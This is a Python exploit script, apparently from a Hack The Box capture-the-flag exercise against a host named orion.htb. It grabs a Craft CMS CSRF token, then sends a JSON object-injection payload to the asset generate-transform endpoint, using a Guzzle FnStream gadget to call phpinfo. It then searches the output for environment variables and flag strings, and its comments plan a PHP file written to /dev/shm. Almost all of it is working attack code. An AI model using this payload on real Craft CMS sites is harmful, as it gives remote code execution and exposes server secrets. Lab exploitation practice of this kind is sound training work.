import requests, re, base64, time

HOST = 'http://orion.htb'

# Step 1: Write PHP code to /dev/shm/ that sets $_ENV then gets included
# Then use PhpManager to include it
# Then use FnStream to call phpinfo (but they're separate requests)

# Actually, let me first just test if FnStream + phpinfo works
print("[*] Testing FnStream + phpinfo ...")
s = requests.Session()
r = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
tok = m.group(1) if m else ''
print(f"    CSRF: {tok[:30] if tok else 'N/A'}...")

# FnStream payload
body = {
    "assetId": 11,
    "handle": {
        "width": 123,
        "height": 123,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "GuzzleHttp\\Psr7\\FnStream",
            "__construct()": [[]],
            "_fn_close": "phpinfo"
        }
    }
}
headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=60)

print(f"    Status: {r2.status_code}, Len: {len(r2.text)}")
t = r2.text

if 'PHP Version' in t:
    print('[+] PHPINFO OUTPUT FOUND!')
    # Find PHP Version section
    idx = t.index('PHP Version')
    print(f'    Found at byte {idx}')
    print(f'    Context: {t[max(0,idx-50):idx+100]}')
    
    # Check for $_ENV or environment variables
    if '$_ENV' in t:
        print('\n[+] $_ENV found in output!')
        # Find all $_ENV entries
        parts = t.split('$_ENV')
        for i, part in enumerate(parts[1:6], 1):
            print(f'    $_ENV entry {i}: {part[:200]}')
    else:
        print('\n[-] $_ENV not in output')
    
    # Check for the PHP Variables section
    if 'PHP Variables' in t:
        pv_idx = t.index('PHP Variables')
        print(f'\n[+] PHP Variables section at byte {pv_idx}')
        print(f'    {t[pv_idx:pv_idx+500]}')
    
    # Try to find any env-like entries
    for pattern in ['UF]', 'RF]', 'USERS]', 'FLAG', 'HTB{', 'user']:
        if pattern in t:
            idx = t.index(pattern)
            print(f'\n[+] Found "{pattern}" at byte {idx}')
            print(f'    Context: {t[max(0,idx-50):idx+150]}')
else:
    print('[-] phpinfo output NOT found')
    print(f'First 500: {t[:500]}')
    print(f'\nLast 500: {t[-500:]}')
